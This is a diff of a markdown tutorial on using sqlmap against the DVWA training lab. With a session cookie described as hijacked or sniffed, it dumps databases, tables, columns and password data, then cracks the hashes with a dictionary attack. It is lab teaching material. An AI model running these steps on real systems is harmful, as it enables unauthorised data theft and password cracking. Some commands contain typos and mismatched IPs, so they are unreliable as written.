@@ -14,7 +14,7 @@ sqlmap goal is to detect and take advantage of SQL injection vulnerabilities in 
 
 assuming we already hijacked a user session and obtained the url and cookies. the following url make a GET request to the server "http://192.168.70.6/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit#". which is vulnerable to SQL injection.
 
-```bsah
+```bash
 sqlmap \ 
     -u "http://192.168.29.131/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit#" \
     -—cookie="PPHPSESSID=b34298a6eb8fcec881d3d0b9cfd9f1f6;security=low”
@@ -23,29 +23,35 @@ sqlmap \
 - `--cookie` cookies captured by sniffing sessions
 
 sqlmap with prompt multiple question, you should answer as follow
-```text
+
+
+```markdown
 it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]
+
+#Answer with no, otherwise the attack will take a very long time.
 ```
-Answer with no, otherwise the attack will take a very long time.
-```text
+
+```markdown
 for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
+
+#Answer with yes
 ```
-Answer with yes
-```text
+```markdown
 GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+
+#Answer with no, anyway you may specify the paremeters with -p option for example -p "id"
 ```
-Answer with no, anyway you may specify the paremeters with `-p` option for example `-p "id"`
 
 
-```
+```markdown
 [15:32:28] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.70.6'
+#The result will be saved to local directory, and any previous attack on the same url will continue on the previous attack. otherwise you may reset the attack by deleting the directory sudo rm "/root/.local/share/sqlmap/output/192.168.70.6"
 ```
-The result will be saved to local directory, and any previous attack on the same url will continue on the previous attack. otherwise you may reset the attack by deleting the directory `sudo rm '/root/.local/share/sqlmap/output/192.168.70.6`
 
 ---
 ### 2- dump all databases
 
-```bsah
+```bash
 sqlmap \ 
     -u "http://192.168.29.131/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit#" \
     -—cookie="PPHPSESSID=b34298a6eb8fcec881d3d0b9cfd9f1f6;security=low” \
@@ -75,7 +81,7 @@ as shown all the databases are dumped.
 ---
 ### 3- dump all tables
 
-```bsah
+```bash
 sqlmap \ 
     -u "http://192.168.29.131/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit#" \
     -—cookie="PPHPSESSID=b34298a6eb8fcec881d3d0b9cfd9f1f6;security=low” \
@@ -106,7 +112,7 @@ as shown all the tables in the specified database are dumped.
 ---
 ### 4- show all columns
 
-```bsah
+```bash
 sqlmap \ 
     -u "http://192.168.29.131/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit#" \
     -—cookie="PPHPSESSID=b34298a6eb8fcec881d3d0b9cfd9f1f6;security=low” \
@@ -145,7 +151,7 @@ as shown all the columns in the specified database and table are shown.
 ---
 ### 5- show all columns
 
-```bsah
+```bash
 sqlmap \ 
     -u "http://192.168.29.131/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit#" \
     -—cookie="PPHPSESSID=b34298a6eb8fcec881d3d0b9cfd9f1f6;security=low” \
@@ -175,7 +181,7 @@ as shown all the data in the specified database and table are dumped.
 ---
 ### 6- dump data from a table (with passwords)
 
-```bsah
+```bash
 sqlmap \ 
     -u "http://192.168.29.131/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit#" \
     -—cookie="PPHPSESSID=b34298a6eb8fcec881d3d0b9cfd9f1f6;security=low” \
@@ -188,14 +194,17 @@ sqlmap \
 - `--dump` dump all data
 
 sqlmap with prompt multiple question, you should answer as follow
-```text
-do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] 
+```markdown
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N]
+ 
+#Answer with no
 ```
-Answer with no
-```text
+
+```markdown
 do you want to crack them via a dictionary-based attack? [Y/n/q] 
+
+#Answer with yes if you want to crack passwords.
 ```
-Answer with yes if you want to crack passwords.
 
 ```
 [15:42:01] [INFO] using hash method 'md5_generic_passwd'
@@ -204,12 +213,13 @@ what dictionary do you want to use?
 [2] custom dictionary file
 [3] file with list of dictionary files
 ```
-as you can see the hashing algorithm is detected `md5_generic_passwd`, select the genric wordlist [1] or specify a custom dictionary file.
+as you can see the hashing algorithm is detected "md5_generic_passwd", select the genric wordlist [1] or specify a custom dictionary file.
 
-```
+```markdown
 do you want to use common password suffixes? (slow!) [y/N]
+
+# Answer with no
 ```
-Answer with no
 
 
 
